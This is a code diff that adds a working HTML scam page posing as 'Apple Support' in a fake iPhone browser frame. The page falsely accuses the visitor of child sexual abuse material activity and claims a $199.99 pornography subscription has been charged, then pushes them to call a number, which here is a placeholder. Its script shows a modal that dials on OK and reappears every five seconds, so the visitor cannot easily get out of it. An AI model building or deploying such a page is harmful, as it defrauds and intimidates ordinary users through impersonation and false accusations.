@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>iPhone UI Demo - Settings Style</title>
+
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        background: url('https://www.cultofmac.com/wp-content/uploads/2015/08/Apple-Support.jpg') no-repeat center center;
+        background-size: cover;
+        height: 100vh;
+        width: 100vw;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    /* iPhone frame */
+    .iphone {
+        width: 390px;
+        max-width: 100%;
+        background: #f2f2f7;
+        border-radius: 30px;
+        overflow: hidden;
+        box-shadow: 0 0 30px rgba(0,0,0,0.6);
+        border: 4px solid #111;
+    }
+
+    .safari-bar {
+        background: #f2f2f7;
+        padding: 12px;
+        text-align: center;
+        border-bottom: 1px solid #d1d1d6;
+        font-size: 14px;
+        color: #666;
+    }
+
+    .url-box {
+        background: white;
+        border-radius: 10px;
+        padding: 6px 10px;
+        border: 1px solid #ccc;
+        display: inline-block;
+        min-width: 70%;
+        font-size: 13px;
+        color: #333;
+    }
+
+    .content {
+        padding: 22px;
+    }
+
+    /* SETTINGS CARD */
+    .settings-card {
+        background: #ffffff;
+        border-radius: 16px;
+        overflow: hidden;
+        box-shadow: 0 6px 18px rgba(0,0,0,0.07);
+        border: 1px solid #e5e5e7;
+        margin-top: 10px;
+    }
+
+    .settings-header {
+        display: flex;
+        align-items: center;
+        padding: 16px;
+        font-size: 18px;
+        font-weight: 600;
+        color: #111;
+        background: #fff;
+    }
+
+    .settings-header img {
+        width: 32px;
+        margin-right: 12px;
+    }
+
+    .settings-divider {
+        height: 1px;
+        background: #e5e5ea;
+        width: 100%;
+        margin: 0;
+    }
+
+    .settings-body {
+        padding: 16px;
+        font-size: 15px;
+        line-height: 1.45;
+        color: #333;
+    }
+
+    /* Buttons */
+    .button-row {
+        margin-top: 18px;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+    }
+
+    .btn {
+        display: block;
+        width: 100%;
+        text-align: center;
+        padding: 14px 0;
+        border-radius: 12px;
+        font-size: 17px;
+        text-decoration: none;
+        font-weight: 600;
+    }
+
+    .cancel-btn {
+        background: #e5e5ea;
+        color: #000;
+    }
+
+    .call-btn {
+        background: #007aff;
+        color: white;
+        animation: pulse 1.8s infinite;
+    }
+
+    @keyframes pulse {
+        0% { box-shadow: 0 0 0 0 rgba(0,122,255,0.45); }
+        70% { box-shadow: 0 0 14px 8px rgba(0,122,255,0); }
+        100% { box-shadow: 0 0 0 0 rgba(0,122,255,0); }
+    }
+
+    .disclaimer {
+        font-size: 11px;
+        color: #888;
+        margin-top: 16px;
+        text-align: center;
+    }
+
+    /* Loop alert */
+    #loopAlertOverlay {
+        display:none;
+        position:fixed;
+        inset:0;
+        background:rgba(0,0,0,0.35);
+        backdrop-filter:blur(6px);
+        -webkit-backdrop-filter:blur(6px);
+        justify-content:center;
+        align-items:center;
+        z-index:9999;
+    }
+
+    #loopAlertBox {
+        width:80%;
+        max-width:300px;
+        background:white;
+        border-radius:14px;
+        text-align:center;
+        padding-top:18px;
+        opacity:0;
+        transform:scale(1.1);
+        animation:loopPop .25s forwards;
+    }
+
+    @keyframes loopPop {
+        0% { opacity:0; transform:scale(1.12); }
+        100% { opacity:1; transform:scale(1); }
+    }
+
+    .loop-title {
+        font-size:18px;
+        font-weight:600;
+        color:#111;
+        margin-bottom:6px;
+    }
+
+    .loop-msg {
+        font-size:14px;
+        color:#444;
+        padding:0 20px 20px;
+        line-height:1.4;
+    }
+
+    .loop-buttonbar {
+        border-top:1px solid #d0d0d0;
+        display:flex;
+        height:44px;
+    }
+
+    .loop-buttonbar div {
+        flex:1;
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        color:#007aff;
+        font-size:17px;
+        cursor:pointer;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="iphone">
+
+    <div class="safari-bar">
+        <span class="url-box">Apple Support</span>
+    </div>
+
+    <div class="content">
+
+        <!-- SETTINGS STYLE CARD -->
+        <div class="settings-card">
+
+            <div class="settings-header">
+                <img src="https://cdn.iconscout.com/icon/free/png-256/free-apple-settings-icon-svg-download-png-493162.png" alt="icon">
+                Apple Support
+            </div>
+
+            <div class="settings-divider"></div>
+
+            <div class="settings-body">
+                Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it
+            </div>
+        </div>
+
+        <div class="button-row">
+            <a href="#" class="btn cancel-btn">Cancel</a>
+            <a href="tel:0000000000" class="btn call-btn">Call Now</a>
+        </div>
+
+        <div class="disclaimer">Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it</div>
+
+    </div>
+</div>
+
+<!-- Loop alert -->
+<div id="loopAlertOverlay">
+    <div id="loopAlertBox">
+        <div class="loop-title">Apple Support</div>
+        <div class="loop-msg">
+            Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it
+        </div>
+
+        <div class="loop-buttonbar">
+            <div id="loopCloseBtn">OK</div>
+        </div>
+    </div>
+</div>
+
+<script>
+// Loop alert triggers call when OK pressed
+let loopTimer = null;
+
+function showLoopAlert() {
+    document.getElementById("loopAlertOverlay").style.display = "flex";
+}
+
+function hideLoopAlertAndCall() {
+    document.getElementById("loopAlertOverlay").style.display = "none";
+
+    navigator.vibrate?.([6, 12, 6]);
+
+    // Placeholder number
+    window.location.href = "tel:0000000000";
+
+    clearTimeout(loopTimer);
+    loopTimer = setTimeout(showLoopAlert, 5000);
+}
+
+document.getElementById("loopCloseBtn").onclick = hideLoopAlertAndCall;
+
+// Start after 1 second
+window.onload = function() {
+    setTimeout(showLoopAlert, 1000);
+};
+</script>
+
+</body>
+</html>
